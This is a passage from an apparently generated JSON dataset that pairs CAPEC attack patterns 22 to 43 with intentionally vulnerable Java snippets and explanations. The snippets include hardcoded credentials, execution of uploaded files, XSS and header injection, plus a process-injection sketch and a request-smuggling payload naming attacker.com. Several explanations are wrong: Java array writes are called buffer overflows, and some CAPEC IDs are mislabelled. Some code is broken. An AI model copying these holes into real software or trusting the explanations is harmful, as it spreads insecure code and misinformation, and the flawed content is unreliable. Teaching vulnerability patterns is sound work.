securely managing session identifiers and ensuring proper validation and handling to prevent unauthorized access."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new ClientHandler(socket).start();\n        }\n    }\n}\n\nclass ClientHandler extends Thread {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.startsWith(\"AUTH\")) {\n                String[] parts = clientMessage.split(\" \");\n                String username = parts[1];\n                String password = parts[2];\n\n                // Vulnerable authentication check\n                if (username.equals(\"admin\") && password.equals(\"password\")) {\n                    out.println(\"Authentication successful\");\n                } else {\n                    out.println(\"Authentication failed\");\n                }\n            }\n\n            // Process other client messages\n            String message;\n            while ((message = in.readLine()) != null) {\n                System.out.println(\"Received: \" + message);\n                out.println(\"Echo: \" + message);\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for client connections on port 8080. The server accepts incoming connections and spawns a new thread to handle each client. The authentication mechanism is flawed (CWE-287: Improper Authentication) as it uses hardcoded credentials ('admin' and 'password') and does not properly validate the client's identity. This can be easily bypassed by an attacker who knows or guesses the credentials. Additionally, the server does not implement any encryption or integrity checks for the communication channel, making it susceptible to man-in-the-middle attacks (CWE-290: Authentication Bypass by Spoofing). The server also does not validate the input properly (CWE-20: Improper Input Validation), which could lead to further exploitation. This code embodies the main idea of CAPEC-Trust in Client Exploitation by demonstrating how a server can be tricked into trusting a malicious client due to weak authentication and lack of proper security mechanisms."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class FileUpload {\n    public static void main(String[] args) {\n        try {\n            // Simulate file upload\n            String uploadedFileName = \"malicious.exe\";\n            Path uploadedFilePath = Paths.get(\"/uploads/\" + uploadedFileName);\n            byte[] fileContent = Files.readAllBytes(uploadedFilePath);\n\n            // Improper input validation\n            if (uploadedFileName.endsWith(\".exe\")) {\n                System.out.println(\"Executable file detected. Proceeding without validation.\");\n                // Dangerous action: executing the uploaded file\n                Runtime.getRuntime().exec(uploadedFilePath.toString());\n            } else {\n                System.out.println(\"File type not recognized. Skipping execution.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload mechanism that embodies the main idea of the CAPEC 'File Content Injection'. The code simulates the upload of a file named 'malicious.exe' to a server directory. It then reads the file content and checks the file extension to determine if it is an executable. If the file is an executable, it proceeds to execute the file without any proper validation. This represents CWE-20 (Improper Input Validation), CWE-434 (Unrestricted Upload of File with Dangerous Type), and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File). The code is vulnerable because it trusts the file extension and executes the file without verifying its safety, potentially allowing an attacker to inject and execute malicious code on the server."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "import java.util.Scanner;\n\npublic class FilterFailureExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your input:\");\n        String userInput = scanner.nextLine();\n        \n        // Vulnerable buffer\n        char[] buffer = new char[10];\n        \n        // Attempt to copy user input to buffer without size check\n        for (int i = 0; i < userInput.length(); i++) {\n            buffer[i] = userInput.charAt(i); // CWE-120, CWE-119\n        }\n        \n        // Simulate filter failure\n        if (userInput.contains(\"<script>\")) { // CWE-20, CWE-74\n            System.out.println(\"Potential XSS attack detected!\");\n        } else {\n            System.out.println(\"Input accepted: \" + new String(buffer));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a filter failure through a buffer overflow. The program reads user input and attempts to copy it into a fixed-size buffer without checking the input length, leading to a potential buffer overflow (CWE-120, CWE-119). Additionally, it simulates a filter that checks for a specific malicious pattern (e.g., an XSS attack) but fails to handle oversized input securely (CWE-20, CWE-74). If the input is too long, it can cause the buffer to overflow, potentially bypassing the filter and leading to security vulnerabilities."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "public class DeadlockExample {\n    private static final Object lock1 = new Object();\n    private static final Object lock2 = new Object();\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> {\n            synchronized (lock1) {\n                System.out.println(\"Thread 1: Holding lock 1...\");\n                try { Thread.sleep(100); } catch (InterruptedException e) {}\n                System.out.println(\"Thread 1: Waiting for lock 2...\");\n                synchronized (lock2) {\n                    System.out.println(\"Thread 1: Holding lock 1 & 2...\");\n                }\n            }\n        });\n\n        Thread thread2 = new Thread(() -> {\n            synchronized (lock2) {\n                System.out.println(\"Thread 2: Holding lock 2...\");\n                try { Thread.sleep(100); } catch (InterruptedException e) {}\n                System.out.println(\"Thread 2: Waiting for lock 1...\");\n                synchronized (lock1) {\n                    System.out.println(\"Thread 2: Holding lock 2 & 1...\");\n                }\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates a classic deadlock scenario, which is the main idea of the CAPEC 'Forced Deadlock'. The code creates two threads, each trying to acquire two locks (lock1 and lock2) in different orders. Thread 1 acquires lock1 and then tries to acquire lock2, while Thread 2 acquires lock2 and then tries to acquire lock1. This situation leads to a deadlock because each thread is waiting for the other to release the lock it needs, and thus neither thread can proceed. This example also touches on related CWEs such as 'Improper Synchronization' (CWE-662) and 'Improper Locking' (CWE-667), as the locks are not managed in a way that prevents deadlock."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class RaceConditionExample {\n    private static final String FILE_PATH = \"example.txt\";\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread writerThread = new Thread(() -> {\n            try {\n                writeToFile(\"Initial content\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n\n        Thread attackerThread = new Thread(() -> {\n            try {\n                // Simulate attacker replacing the file\n                File maliciousFile = new File(FILE_PATH);\n                if (maliciousFile.exists()) {\n                    maliciousFile.delete();\n                }\n                writeToFile(\"Malicious content\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n\n        writerThread.start();\n        // Ensure the writer thread starts first\n        Thread.sleep(10);\n        attackerThread.start();\n\n        writerThread.join();\n        attackerThread.join();\n    }\n\n    private static void writeToFile(String content) throws IOException {\n        FileWriter writer = new FileWriter(FILE_PATH, true);\n        writer.write(content);\n        writer.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability where two threads are accessing and modifying the same file concurrently. The `writerThread` writes 'Initial content' to the file, while the `attackerThread` simulates an attacker replacing the file with 'Malicious content'. The race condition occurs because the file operations are not properly synchronized, allowing the attacker to potentially replace the file before the legitimate write operation completes. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and related CWEs such as CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization) and CWE-667 (Improper Locking)."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermissions;\n\npublic class SymlinkRaceCondition {\n    public static void main(String[] args) {\n        String tempFileName = \"/tmp/tempfile.txt\";\n        String sensitiveFileName = \"/etc/sensitivefile.txt\";\n        Path tempFilePath = Paths.get(tempFileName);\n        Path sensitiveFilePath = Paths.get(sensitiveFileName);\n\n        try {\n            // Check if the temporary file exists\n            if (Files.exists(tempFilePath)) {\n                System.out.println(\"Temporary file already exists.\");\n                return;\n            }\n\n            // Simulate a delay to create a race condition window\n            Thread.sleep(1000);\n\n            // Create the temporary file\n            Files.createFile(tempFilePath);\n            System.out.println(\"Temporary file created.\");\n\n            // Write to the temporary file\n            try (FileWriter writer = new FileWriter(tempFileName)) {\n                writer.write(\"This is a temporary file.\");\n            }\n\n            // Set file permissions (simulating sensitive file permissions)\n            Files.setPosixFilePermissions(tempFilePath, PosixFilePermissions.fromString(\"rw-r--r--\"));\n\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability involving symbolic links. The code checks if a temporary file exists, then waits for a second before creating the file. During this delay, an attacker could create a symbolic link pointing to a sensitive file (e.g., /etc/sensitivefile.txt). When the program creates and writes to the temporary file, it would actually be writing to the sensitive file due to the symbolic link. This embodies the CAPEC 'Leveraging Race Conditions via Symbolic Links' and highlights related CWEs such as TOCTOU race conditions, improper synchronization, and symlink following."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import java.io.*;\nimport java.util.Random;\n\npublic class FuzzingExample {\n    public static void main(String[] args) {\n        String[] inputs = generateRandomInputs(100);\n        for (String input : inputs) {\n            try {\n                processInput(input);\n            } catch (Exception e) {\n                System.out.println(\"Error processing input: \" + e.getMessage());\n            }\n        }\n    }\n\n    private static String[] generateRandomInputs(int count) {\n        String[] inputs = new String[count];\n        Random random = new Random();\n        for (int i = 0; i < count; i++) {\n            inputs[i] = \"input\" + random.nextInt(1000);\n        }\n        return inputs;\n    }\n\n    private static void processInput(String input) throws Exception {\n        if (input.contains(\"<script>\")) {\n            throw new Exception(\"Invalid input detected\");\n        }\n        // Simulate processing the input\n        System.out.println(\"Processing: \" + input);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic fuzzing approach by generating random inputs and processing them. The `generateRandomInputs` method creates an array of random strings, which are then processed by the `processInput` method. If the input contains a specific pattern (e.g., '<script>'), an exception is thrown, simulating the detection of an invalid input. This example highlights the concept of fuzzing by feeding random inputs to a system to uncover potential weaknesses, such as improper input validation (CWE-20) and incomplete list of disallowed inputs (CWE-184). The error messages generated may also contain sensitive information (CWE-209)."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class TOCTOURaceCondition {\n    public static void main(String[] args) {\n        String filePath = \"example.txt\";\n        File file = new File(filePath);\n\n        // Time of Check\n        if (file.exists()) {\n            System.out.println(\"File exists. Proceeding to write.\");\n\n            // Simulate a delay to create a window for race condition\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            // Time of Use\n            try (FileWriter writer = new FileWriter(filePath, true)) {\n                writer.write(\"Appending some data.\");\n                System.out.println(\"Data written to file.\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"File does not exist.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The program first checks if a file named 'example.txt' exists. If the file exists, it simulates a delay (representing a window of opportunity for an attacker) before writing data to the file. During this delay, an attacker could potentially delete or replace the file, leading to unexpected behavior when the program attempts to write to the file. This example embodies the main idea of CAPEC-367 and related CWEs by illustrating how a resource's state can change between the check and use, causing potential security vulnerabilities."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import com.sun.jna.Memory;\nimport com.sun.jna.Native;\nimport com.sun.jna.Pointer;\nimport com.sun.jna.platform.win32.Kernel32;\nimport com.sun.jna.platform.win32.WinNT;\n\npublic class PrivilegedThreadHijack {\n    public static void main(String[] args) {\n        int pid = 1234; // Target process ID\n        WinNT.HANDLE process = Kernel32.INSTANCE.OpenProcess(WinNT.PROCESS_ALL_ACCESS, false, pid);\n        if (process == null) {\n            System.err.println(\"Failed to open process\");\n            return;\n        }\n\n        WinNT.HANDLE thread = Kernel32.INSTANCE.CreateRemoteThread(process, null, 0, new Pointer(0x12345678), null, 0, null);\n        if (thread == null) {\n            System.err.println(\"Failed to create remote thread\");\n            Kernel32.INSTANCE.CloseHandle(process);\n            return;\n        }\n\n        Memory payload = new Memory(1024);\n        payload.setString(0, \"malicious code\");\n        Pointer remoteMemory = Kernel32.INSTANCE.VirtualAllocEx(process, null, payload.size(), WinNT.MEM_COMMIT, WinNT.PAGE_EXECUTE_READWRITE);\n        if (remoteMemory == null) {\n            System.err.println(\"Failed to allocate memory in remote process\");\n            Kernel32.INSTANCE.CloseHandle(thread);\n            Kernel32.INSTANCE.CloseHandle(process);\n            return;\n        }\n\n        Kernel32.INSTANCE.WriteProcessMemory(process, remoteMemory, payload, (int) payload.size(), null);\n        Kernel32.INSTANCE.ResumeThread(thread);\n\n        Kernel32.INSTANCE.CloseHandle(thread);\n        Kernel32.INSTANCE.CloseHandle(process);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of hijacking a privileged thread of execution by injecting malicious code into a running process. The code uses the JNA (Java Native Access) library to interact with Windows API functions. It opens a target process, creates a remote thread within that process, allocates memory in the remote process, writes a malicious payload to the allocated memory, and resumes the thread to execute the payload. This embodies the CAPEC idea of hijacking a privileged thread to evade detection and gain elevated privileges. The code also touches on related CWEs such as improper privilege management (CWE-270), process control (CWE-114), and potential race conditions (CWE-362)."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableCookieHandler {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Retrieve cookie without validation\n        Cookie[] cookies = request.getCookies();\n        String sessionId = null;\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (\"sessionId\".equals(cookie.getName())) {\n                    sessionId = cookie.getValue();\n                    break;\n                }\n            }\n        }\n\n        // Assume sessionId is immutable and use it directly\n        if (sessionId != null) {\n            // Simulate sensitive operation based on sessionId\n            response.getWriter().println(\"Welcome back, user with session: \" + sessionId);\n        } else {\n            // Create a new sessionId and set it in a cookie\n            sessionId = \"newSessionId123\";\n            Cookie newCookie = new Cookie(\"sessionId\", sessionId);\n            newCookie.setHttpOnly(true); // Attempt to mitigate some risks\n            response.addCookie(newCookie);\n            response.getWriter().println(\"New session created with sessionId: \" + sessionId);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of handling HTTP cookies in a web application. The code retrieves cookies from the incoming HTTP request without proper validation (CWE-565) and assumes the sessionId cookie is immutable (CWE-302). It also does not encrypt the sessionId (CWE-311) and stores it in cleartext (CWE-315). The code represents the main idea of CAPEC-Accessing/Intercepting/Modifying HTTP Cookies by showing how an attacker could exploit these weaknesses to access or modify session information, potentially leading to session hijacking or impersonation."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to Cross-Site Scripting (XSS) through HTTP query strings. The servlet processes a GET request and retrieves a parameter named 'input' from the query string without proper validation or encoding. It then directly includes this user input in the HTML response. This lack of input neutralization (CWE-80, CWE-79) and improper encoding (CWE-116) allows an attacker to inject malicious scripts. When a victim visits the crafted URL, the malicious script executes in their browser, leading to potential security breaches. This example highlights the importance of validating and encoding user inputs to prevent XSS attacks."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class HttpRequestSmugglingServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Read the original request\n        BufferedReader reader = request.getReader();\n        StringBuilder originalRequest = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            originalRequest.append(line).append(\"\\r\\n\");\n        }\n\n        // Maliciously crafted request to exploit HTTP request smuggling\n        String maliciousRequest = \"POST / HTTP/1.1\\r\\n\" +\n                                  \"Host: victim.com\\r\\n\" +\n                                  \"Content-Length: 13\\r\\n\" +\n                                  \"\\r\\n\" +\n                                  \"GET / HTTP/1.1\\r\\n\" +\n                                  \"Host: attacker.com\\r\\n\\r\\n\";\n\n        // Combine the original and malicious requests\n        String combinedRequest = originalRequest.toString() + maliciousRequest;\n\n        // Forward the combined request to the backend server\n        URL url = new URL(\"http://backend-server.com\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setDoOutput(true);\n        conn.setRequestMethod(\"POST\");\n        OutputStream os = conn.getOutputStream();\n        os.write(combinedRequest.getBytes());\n        os.flush();\n        os.close();\n\n        // Get the response from the backend server\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        StringBuilder responseContent = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            responseContent.append(inputLine);\n        }\n        in.close();\n\n        // Send the response back to the client\n        response.getWriter().write(responseContent.toString());\n    }\n}",
        "description": "This Java servlet code demonstrates an HTTP Request Smuggling attack. The servlet reads the original HTTP request from the client, appends a maliciously crafted request, and forwards the combined request to a backend server. The malicious request is designed to exploit discrepancies in how different HTTP agents (e.g., proxies, load balancers) interpret HTTP requests, potentially allowing an attacker to send unauthorized requests to the backend server. This code snippet embodies the main idea of CAPEC-33 (HTTP Request Smuggling) and highlights related weaknesses such as inconsistent interpretation of HTTP requests (CWE-444) and improper neutralization of CRLF sequences (CWE-113)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable to HTTP Response Splitting\n        response.setHeader(\"Location\", \"/newpage?param=\" + userInput);\n        response.getWriter().println(\"<html><body>Redirecting...</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Response Splitting. The servlet takes a user input from an HTTP request parameter and directly includes it in an HTTP header without proper sanitization. If an attacker includes CRLF characters in the input, they can inject additional headers or even entire HTTP responses, leading to potential security issues such as cache poisoning or cross-site scripting (XSS). This code snippet embodies the main idea of CAPEC-34 (HTTP Response Splitting) and is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class VulnerableConfigLoader {\n    public static void main(String[] args) {\n        try {\n            Properties config = new Properties();\n            FileInputStream fis = new FileInputStream(\"config.properties\");\n            config.load(fis);\n            fis.close();\n\n            // Vulnerable code: directly using configuration value in an eval-like context\n            String command = config.getProperty(\"command\");\n            Runtime.getRuntime().exec(command); // CWE-95: Eval Injection\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a configuration file ('config.properties') and directly uses a configuration value to execute a system command. This embodies the CAPEC 'Leverage Executable Code in Non-Executable Files' by exploiting the trust in configuration files. The code is vulnerable to CWE-95 (Eval Injection) as it does not neutralize the input from the configuration file before using it in a dynamic evaluation context (Runtime.exec). An attacker could modify the 'config.properties' file to include malicious commands, leading to arbitrary code execution."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "public class UnpublishedInterface {\n    // Undocumented and unpublished method\n    void secretFunction() {\n        System.out.println(\"Secret functionality accessed!\");\n    }\n\n    public static void main(String[] args) {\n        UnpublishedInterface ui = new UnpublishedInterface();\n        // Directly invoking the unpublished method without any authentication or authorization\n        ui.secretFunction();\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Using Unpublished Interfaces or Functionality' (CAPEC). The class `UnpublishedInterface` contains a method `secretFunction` that is not intended to be publicly accessible. However, this method can be invoked directly without any authentication or authorization checks, embodying CWE-306 (Missing Authentication for Critical Function) and CWE-862 (Missing Authorization). The `main` method creates an instance of `UnpublishedInterface` and calls the `secretFunction`, showcasing how an attacker could exploit this vulnerability to access unauthorized functionality. This example highlights the risks associated with undocumented and unprotected interfaces in software systems."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataExample {\n    public static void main(String[] args) {\n        String sensitiveData = \"password123\"; // CWE-312: Cleartext Storage of Sensitive Information\n        File file = new File(\"sensitiveData.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData); // CWE-312: Storing sensitive data in cleartext\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n        // The sensitive data is not cleared from memory after use\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in CAPEC- Retrieve Embedded Sensitive Data. The code stores sensitive information (a password) in cleartext within a file, which is a direct example of CWE-312 (Cleartext Storage of Sensitive Information). Additionally, the code does not clear the sensitive data from memory after use, which aligns with CWE-226 (Sensitive Information in Resource Not Removed Before Reuse). This makes the sensitive data easily retrievable by an attacker who can access the file or memory, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String configPath = System.getenv(\"CONFIG_PATH\");\n        if (configPath == null) {\n            configPath = \"./default/config.properties\";\n        }\n\n        try (FileInputStream fis = new FileInputStream(configPath)) {\n            Properties config = new Properties();\n            config.load(fis);\n\n            String dbPassword = config.getProperty(\"db.password\");\n            System.out.println(\"Database password: \" + dbPassword);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the CAPEC 'Leveraging/Manipulating Configuration File Search Paths'. The program reads a configuration file path from an environment variable 'CONFIG_PATH'. If the environment variable is not set, it defaults to a local path './default/config.properties'. The code then loads properties from the specified configuration file and prints the database password.\n\nThe vulnerabilities present in this code include:\n1. CWE-426 (Untrusted Search Path): The program uses an externally-supplied search path (CONFIG_PATH) which can be manipulated by an attacker to point to a malicious configuration file.\n2. CWE-427 (Uncontrolled Search Path Element): The default path './default/config.properties' can be replaced by an attacker if they have write access to the directory.\n3. CWE-73 (External Control of File Name or Path): The file path is controlled by an external input (environment variable).\n4. CWE-555 (J2EE Misconfiguration: Plaintext Password in Configuration File): The database password is stored in plaintext in the configuration file.\n5. CWE-99 (Improper Control of Resource Identifiers): The program does not validate or sanitize the input path, allowing potential resource injection.\n\nThis code snippet highlights the risks of using external inputs for critical resource paths and the importance of securing configuration files and paths."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableTokenHandler {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        // Retrieve token from cookie\n        Cookie[] cookies = request.getCookies();\n        String token = null;\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"authToken\")) {\n                    token = cookie.getValue();\n                    break;\n                }\n            }\n        }\n\n        // Assume token is immutable and use it directly\n        if (token != null) {\n            // Perform authentication based on token\n            if (authenticateUser(token)) {\n                response.setStatus(HttpServletResponse.SC_OK);\n                response.getWriter().write(\"Authenticated\");\n            } else {\n                response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n                response.getWriter().write(\"Authentication Failed\");\n            }\n        } else {\n            response.setStatus(HttpServletResponse.SC_BAD_REQUEST);\n            response.getWriter().write(\"No auth token provided\");\n        }\n    }\n\n    private boolean authenticateUser(String token) {\n        // Dummy authentication logic\n        return \"validToken123\".equals(token);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of handling authentication tokens stored in cookies. The code retrieves a token from a cookie named 'authToken' and uses it directly for authentication without any integrity checks or validation. This embodies the CAPEC 'Manipulating Opaque Client-based Data Tokens' by assuming the token is immutable and secure, which can be exploited by an attacker. The related CWEs are represented as follows: CWE-353 (Missing Support for Integrity Check), CWE-285 (Improper Authorization), CWE-302 (Authentication Bypass by Assumed-Immutable Data), CWE-472 (External Control of Assumed-Immutable Web Parameter), CWE-565 (Reliance on Cookies without Validation and Integrity Checking), and CWE-315 (Cleartext Storage of Sensitive Information in a Cookie)."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class TerminalDeviceExploit {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter command: \");\n        String userInput = scanner.nextLine();\n\n        // Vulnerable code: writing user input directly to a terminal device\n        try (FileWriter writer = new FileWriter(\"/dev/pts/1\")) { // Assuming /dev/pts/1 is the target terminal device\n            writer.write(userInput + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where user input is written directly to a terminal device (/dev/pts/1). The code reads a command from the user and writes it to the terminal device without any sanitization or validation. This can lead to command injection (CWE-77, CWE-78) if the input contains malicious commands. Additionally, the sensitive command is visible to other processes (CWE-214), and the terminal device is assumed to be writable by unauthorized users (CWE-529). The main idea of the CAPEC is to exploit writeable terminal devices to execute malicious commands with the target user's privileges."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.*;\nimport javax.mail.internet.*;\n\npublic class EmailSender {\n    public static void main(String[] args) {\n        String to = \"victim@example.com\";\n        String from = \"attacker@example.com\";\n        String host = \"smtp.example.com\";\n\n        Properties properties = System.getProperties();\n        properties.setProperty(\"mail.smtp.host\", host);\n\n        Session session = Session.getDefaultInstance(properties);\n\n        try {\n            MimeMessage message = new MimeMessage(session);\n            message.setFrom(new InternetAddress(from));\n            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));\n            message.setSubject(\"Test Email\");\n\n            // Vulnerable code: Injecting malicious payload in email headers\n            String maliciousHeader = \"\\r\\nX-Injected-Header: malicious\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert('Injected!');</script>\";\n            message.setHeader(\"X-Custom-Header\", maliciousHeader);\n\n            message.setText(\"This is a test email.\");\n\n            Transport.send(message);\n            System.out.println(\"Sent message successfully....\");\n        } catch (MessagingException mex) {\n            mex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might inject malicious payloads into email headers by leveraging meta-characters. The code sets up a basic email sending functionality using JavaMail API. The key vulnerability is in the 'maliciousHeader' string, which includes meta-characters to inject a new header and a script tag. This can lead to improper behavior in email clients that do not properly neutralize such meta-characters, potentially allowing the execution of malicious scripts. This example embodies the CAPEC concept of using meta-characters in email headers to inject malicious payloads, and it highlights related weaknesses such as improper neutralization of escape sequences (CWE-150) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import java.io.*;\n\npublic class MimeConversion {\n    public static void main(String[] args) {\n        String input = \"A very long string that exceeds the buffer size...\"; // Simulated input\n        byte[] buffer = new byte[10]; // Small buffer size\n        try {\n            convertToMime(input, buffer);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void convertToMime(String input, byte[] buffer) throws IOException {\n        // CWE-120: Buffer Copy without Checking Size of Input\n        byte[] inputBytes = input.getBytes(\"UTF-8\");\n        System.arraycopy(inputBytes, 0, buffer, 0, inputBytes.length); // Potential buffer overflow\n        // Further processing...\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable MIME conversion routine. The `convertToMime` method takes an input string and a buffer, then attempts to copy the input string's bytes into the buffer without checking if the buffer is large enough to hold the input. This can lead to a buffer overflow (CWE-120). The code represents the main idea of the CAPEC by showing how an attacker could exploit a weakness in the MIME conversion process to cause a buffer overflow and potentially gain control over the system. The small buffer size and the unchecked copy operation are key points of vulnerability."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
